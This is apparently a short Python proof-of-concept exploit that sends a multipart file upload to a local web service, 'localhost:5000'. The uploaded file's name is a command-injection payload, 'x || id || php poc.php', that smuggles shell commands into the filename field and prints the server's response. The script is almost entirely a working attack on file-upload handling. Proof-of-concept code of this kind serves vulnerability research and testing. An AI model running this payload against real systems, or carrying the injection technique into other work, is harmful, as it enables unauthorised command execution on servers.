import requests

port = "5000"
url = f"http://localhost:{port}"

commands = "id"
payload = f"x || {commands} || php poc.php"

r = requests.post(url, files=[("file", (payload, "anything", "application/x-php"))])

print(r.text)
